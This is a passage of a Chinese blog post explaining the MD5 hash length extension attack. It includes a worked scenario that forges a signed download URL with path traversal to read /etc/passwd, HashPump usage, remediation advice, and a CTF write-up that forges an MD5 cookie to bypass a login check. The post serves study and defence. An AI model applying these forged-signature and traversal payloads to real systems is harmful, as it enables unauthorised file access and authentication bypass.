+<p><strong>注意，这里的 $h0、h1、h2、h3$ 分别为上述的 $A、B、C、D$，并且用 $32 \ bit$ 有符号整型数表示。</strong>如 run time &#x3D; 0 时的 $h0$：</p>
+<p>$$<br>h0 &#x3D; 841628852 &#x3D; 0x322a3cb4<br>$$</p>
+<p>其小端字节序正好对应散列值的第 $1$ ~ $4 \ Byte$，即 $0xb43c2a32$。对于负数，其补码表示的正数与其在模 $2^{32}$ 下同余的正数相等，如 run time &#x3D; 0 时的 $h2$：</p>
+<p>$$<br>h2 &#x3D; -474181071 \equiv 3820786225 \ mod \ 2^{32} &#x3D; 0xe3bc9231<br>$$</p>
+<p>其小端字节序对应散列值的第 $9$ ~ $12 \ Byte$，即 $0x3192bce3$。</p>
+<p>此处纠正 Understanding MD5 Length Extension Attack 文中 PoC 源代码中的一处错误，在 md5_le.js 文件的 159 行：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="built_in">parseInt</span>(m_len/<span class="number">64</span>)+<span class="number">1</span>; i &lt; databytes.<span class="property">length</span> / <span class="number">64</span>; i++)</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>i = parseInt(m_len / 64) + 1</code> 并非恒成立，当 $56 \le m_len \ % \ 64 \lt 64$ 时，附加填充将会多占用一个字节，此时应为 <code>i = parseInt(m_len / 64) + 2</code>。</p>
+<p><strong>解决方案：在循环前先判断变量 <code>m_len</code> 的范围，再决定变量 <code>i</code> 的取值。</strong></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>假设已登录用户要在某个网站下载 <code>test.pdf</code> 文件，点击下载链接后 URL 如下所示：</p>
+<p><code>http://example.com/download?login=1&amp;file=test.pdf&amp;hash=f26e1f5aa1094662caf3a6f8b774e824 </code></p>
+<p>已知网站服务器是 Linux 操作系统，后端使用 Python 脚本语言，并在用户下载文件前，需要验证用户的下载权限，所以会先用以下算法生成一个关于文件名的哈希值附在链接末尾：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_hash</span>(<span class="params">salt, login, file_name</span>):</span><br><span class="line">	<span class="keyword">return</span> md5(salt + login + file_name).hexdigest()</span><br></pre></td></tr></table></figure>
+
+<p>再用以下算法验证下载请求的合法性：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">verify_hash</span>(<span class="params">salt, login, file_name, user_hash</span>):</span><br><span class="line">	<span class="keyword">if</span> login:</span><br><span class="line">		valid_hash = create_hash(salt, login, file_name)</span><br><span class="line">		<span class="keyword">if</span> valid_hash == user_hash:</span><br><span class="line">			permit_download(file_name)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&quot;Your hash is invalid.&quot;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;Please login.&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>在不知道 <code>salt</code> 具体的值，但知道其长度的情况下，能否下载根目录下的 <code>/etc/passwd</code> 文件呢？</p>
+<p>假设 <code>salt</code> 的长度为 6，先列出原问题的已知参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">login = &quot;1&quot;</span><br><span class="line">file = &quot;test.pdf&quot;</span><br><span class="line">length(login || file) = 9 Byte = 72 bit</span><br><span class="line">length(salt) = 6 Byte = 48 bit</span><br><span class="line">hash = MD5(salt || &quot;1test.pdf&quot;) = f26e1f5aa1094662caf3a6f8b774e824</span><br></pre></td></tr></table></figure>
+
+<p>再列出待解问题的未知参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">login = ？</span><br><span class="line">file = &quot;../../../../../../etc/passwd&quot;</span><br><span class="line">length(login) = ？</span><br><span class="line">length(salt || &quot;1test.pdf&quot;) = 15 Byte = 120 bit</span><br><span class="line">hash = MD5(salt || login || &quot;../../../../../../etc/passwd&quot;) = ？</span><br></pre></td></tr></table></figure>
+
+<p>由上述参数的变化可知，若改变 <code>login</code> 的值后，还能计算出对应的签名，即可达到<strong>任意文件下载</strong>的目的。根据漏洞原理，利用 0x03 中的 HashPump 工具可解出上述未知参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: f26e1f5aa1094662caf3a6f8b774e824</span><br><span class="line">Input Data: 1test.pdf</span><br><span class="line">Input Key Length: 6</span><br><span class="line">Input Data to Add: ../../../../../../etc/passwd</span><br><span class="line">ee3dc297d57bd7bf82ccf0ae20e35c6b</span><br><span class="line">1test.pdf\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x00\x00\x00\x00\x00\x00\x00../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>可见，在成功构造 <code>login</code> 后，并重新计算出新的签名，结果如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">login = &quot;1test.pdf\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x00\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">file = &quot;../../../../../../etc/passwd&quot;</span><br><span class="line">length(login) = 58 Byte = 464 bit</span><br><span class="line">length(salt || &quot;1test.pdf&quot;) = 15 Byte = 120 bit</span><br><span class="line">hash = MD5(salt || login || &quot;../../../../../../etc/passwd&quot;) = ee3dc297d57bd7bf82ccf0ae20e35c6b</span><br></pre></td></tr></table></figure>
+
+<p>注意，需要将上述 <code>login</code> 的值进行 URL 编码，以适应浏览器的请求格式，最终构造下载链接的 URL 即可下载 <code>/etc/passwd</code> 文件：</p>
+<p><code>http://example.com/download?login=1test.pdf%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%78%00%00%00%00%00%00%00&amp;file=../../../../../../etc/passwd&amp;hash=ee3dc297d57bd7bf82ccf0ae20e35c6b</code></p>
+<p><strong>哈希长度扩展攻击的限制条件较多，现实中并不常见，下面关于上述漏洞利用场景作几点说明：</strong></p>
+<ol>
+<li>对于不同文件的校验哈希值，必须由同一个 <code>salt</code> 值产生的；</li>
+<li>Web 服务器必须有访问其他目录的权限，否则无法访问根目录下的 <code>/etc/passwd</code> 文件；</li>
+<li><code>../</code> 是在命令行下返回上级目录的操作符。由于文件下载目录不在根目录下，所以要通过多个 <code>../</code> 操作返回根目录。注意，在根目录下返回上级目录，仍然是根目录。</li>
+</ol>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>Hash Length Extension Attack 是 Merkle–Damgård 结构的固有缺陷，只要采用了此结构的哈希函数都会存在此漏洞。因此没有药到病除的方法，只有以下几条权宜之计供参考：</p>
+<ol>
+<li><strong>采用 HAMC 或 SHA-3 等</strong>非 Merkle–Damgård 结构的哈希算法；</li>
+<li><strong>采用连续两次加「盐」哈希运算</strong>，即 $hash(salt \ + hash(salt \ + \ message))$；</li>
+<li><strong>将 $secret$ 值放在输入参数末尾。</strong>若已知 $MD5(message1 \ || \ secret)$，我们希望能求出 $MD5(message1 \ || \ secret \ || \ padding1 \ || \ message2)$，但实际上 $secret$ 的附加策略是在输入参数末尾，因此只能得到 $MD5(message1 \ || \ padding1^{‘} \ || \ message2 \ || \ secret)$。显然，在 $secret$ 未知的情况下是求不出该值的。</li>
+</ol>
+<h1 id="0x03-HashPump"><a href="#0x03-HashPump" class="headerlink" title="0x03 HashPump"></a>0x03 HashPump</h1><p><a target="_blank" rel="noopener" href="https://github.com/bwall/HashPump">HashPump</a> 是基于 OpenSSL 的哈希长度扩展攻击工具，支持对 MD5、SHA-1、SHA-256、SHA-512 等哈希函数的攻击利用。</p>
+<p>以下只介绍在 Kali Linux 使用环境下的安装流程，以下命令需要用 <code>root</code> 权限完成：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> https://github.com/bwall/HashPump.git</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">apt-get update</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">apt-get install g++ libssl-dev</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> HashPump</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make install</span></span><br></pre></td></tr></table></figure>
+
+<p>安装完成后，输入以下命令，即可得到 HashPump 的用法帮助：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">hashpump -h</span></span><br><span class="line">HashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength]</span><br><span class="line">    HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.</span><br><span class="line">    -h --help          Display this message.</span><br><span class="line">    -t --test          Run tests to verify each algorithm is operating properly.</span><br><span class="line">    -s --signature     The signature from known message.</span><br><span class="line">    -d --data          The data from the known message.</span><br><span class="line">    -a --additional    The information you would like to add to the known message.</span><br><span class="line">    -k --keylength     The length in bytes of the key being used to sign the original message with.</span><br><span class="line">    Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.</span><br><span class="line">    &lt;Developed by bwall(@botnet_hunter)&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x04-writeups"><a href="#0x04-writeups" class="headerlink" title="0x04 writeups"></a>0x04 writeups</h1><p>介绍完 Hash Length Extension Attack 的原理与 HashPump 工具的使用方法后，下面借助相关的 CTF 题目来展示该漏洞的实际利用过程。</p>
+<h2 id="【实验吧-CTF】-Web-——-让我进去"><a href="#【实验吧-CTF】-Web-——-让我进去" class="headerlink" title="【实验吧 CTF】 Web —— 让我进去"></a>【实验吧 CTF】 Web —— 让我进去</h2><p>此题结合了 PHP 的代码审计与 Hash Length Extension Attack，难度中等，需要的基础知识有：<strong>PHP、Linux、HTTP协议、MD5加密原理。</strong>相关链接如下：</p>
+<ul>
+<li>题目链接：<a target="_blank" rel="noopener" href="http://www.shiyanbar.com/ctf/1848">http://www.shiyanbar.com/ctf/1848</a></li>
+<li>解题链接：<a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/web/kzhan.php">http://ctf5.shiyanbar.com/web/kzhan.php</a></li>
+</ul>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-question.jpg" alt="lmi-question"></p>
+<p>进入解题链接，发现如下输入框，任意输入一些值，或尝试注入，均无报错信息，且源码也无干货。</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-input.jpg" alt="lmi-input"></p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-source1.jpg" alt="lmi-source1"></p>
+<p>接下来查看它的 HTTP 请求头，发现有两个属于题目本域的异常 Cookie，分别为：<code>sample-hash = 571580b26c65f306376d4f64e53cb5c7</code> 和 <code>source = 0</code>。</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-cookie.jpg" alt="lmi-cookie"></p>
+<p>尝试用 BurpSuite 把 <code>source</code> 的值改为 1，再次发出请求，果然得到了真正的源代码：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-source2.jpg" alt="lmi-source2"></p>
+<p>由以下语句可知 Cookie <code>sample-hash</code> 原来是 <code>$secret</code> 与「adminadmin」连接而成的字符串的 MD5 散列值，即上述的 $MD5(secret || message1)$， $secret$ 为 $15 \ Byte$ 长的字符串变量 <code>$secret</code>，$message1$ 为字符串「adminadmin」 。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;sample-hash&quot;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span> . <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;admin&quot;</span> . <span class="string">&quot;admin&quot;</span>)), <span class="title function_ invoke__">time</span>() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br></pre></td></tr></table></figure>
+
+<p>又由以下核心语句，得知爆 flag 的条件是设置一个新 Cookie <code>getmein</code>，它的值要与 <code>$secret + $username + $password</code> 组成的字符串的 MD5 散列值相等，但前面还有一个限制条件：<code>$username</code> <strong>必须等于</strong>「admin」，且 <code>$password</code> <strong>不能等于</strong>「admin」。想到这里，就可知此题是要用 Hash Length Extension Attack 来伪造新的散列值绕过验证。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;getmein&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$username</span>) === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="title function_ invoke__">urldecode</span>(<span class="variable">$password</span>) != <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">&quot;getmein&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span> . <span class="title function_ invoke__">urldecode</span>(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Congratulations! You are a registered user.\n&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The flag is &quot;</span>. <span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;You are not an admin! LEAVE.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先要理清代码中的变量与 Hash Length Extension Attack 中变量的对应关系，下面用 HashPump 展示说明该漏洞的攻击过程：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-hashpump.jpg" alt="lmi-hashpump"></p>
+<ul>
+<li><p><strong>Input Signature</strong> 是 $MD5(secret \ || \ message1)$，此处为 <code>sample-hash</code> 的取值<code>571580b26c65f306376d4f64e53cb5c7</code>；</p>
+</li>
+<li><p><strong>Input Data</strong> 是 $message1$，此处为字符串「adminadmin」；</p>
+</li>
+<li><p><strong>Input Key Length</strong> 是 $secret$ 的长度，此处为 15；</p>
+</li>
+<li><p><strong>Input Data to Add</strong> 是 $message2$，此处设为字符串「ciphersaw」。</p>
+</li>
+</ul>
+<p>可见，得到了 $MD5(secret \ || \ message1 \ || \ padding1 \ || \ message2)$ 的结果为 <code>ca78a24c34c2e13331e7b0425b567b09</code> 。</p>
+<p>最后，我们只要构造攻击 payload，在 Username 和 Password 框中输入，再创建一个新 Cookie <code>getmein = ca78a24c34c2e13331e7b0425b567b09</code>，Submit 后即能得到 flag 。构造的 payload 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username：admin</span><br><span class="line">Password：admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00ciphersaw</span><br></pre></td></tr></table></figure>
+
+<p>但注意到源码在判断之前先用 <code>urldecode()</code> 函数对 <code>$username</code> 和 <code>$password</code> 进行 URL 解码，因此要把以上 payload 转换成 URL 编码形式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username：%61%64%6d%69%6e</span><br><span class="line">Password：%61%64%6d%69%6e%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00%63%69%70%68%65%72%73%61%77</span><br></pre></td></tr></table></figure>
+
+<p>正确输入 payload 后，成功得到 flag：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-flag.jpg" alt="lmi-flag"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>Cipher Saw
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://ciphersaw.me/2017/11/12/hash-length-extension-attack/" title="Hash Length Extension Attack（哈希长度扩展攻击）">https://ciphersaw.me/2017/11/12/hash-length-extension-attack/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/Audit/" rel="tag"># Audit</a>
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/Crypto/" rel="tag"># Crypto</a>
+              <a href="/tags/Vulnerability/" rel="tag"># Vulnerability</a>
+              <a href="/tags/%E5%AE%9E%E9%AA%8C%E5%90%A7/" rel="tag"># 实验吧</a>
+              <a href="/tags/MD5/" rel="tag"># MD5</a>
+              <a href="/tags/Python/" rel="tag"># Python</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2017/10/27/cnss-2017-crypto-rsa-combo/" rel="prev" title="【CNSS 2017】 Crypto —— RSA Combo">
+                  <i class="fa fa-chevron-left"></i> 【CNSS 2017】 Crypto —— RSA Combo
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2017/11/16/play-well-single-and-double-quotes-in-eval-function-of-php/" rel="next" title="玩转 PHP eval() 中的单双引号">
+                  玩转 PHP eval() 中的单双引号 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments" id="disqus_thread">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-space-shuttle"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cipher Saw</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+  
+
+
+  <script class="next-config" data-name="leancloud_visitors" type="application/json">{"enable":true,"app_id":"KWe6NtO4vhgQR3IfB99JElre-gzGzoHsz","app_key":"7nrrRDyHHUMcx03upUALYKIQ","server_url":null,"security":false}</script>
+  <script src="/js/third-party/statistics/lean-analytics.js"></script>
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"ciphersaw","count":false,"i18n":{"disqus":"disqus"}}</script>
+<script src="/js/third-party/comments/disqus.js"></script>
+
+</body>
+</html>
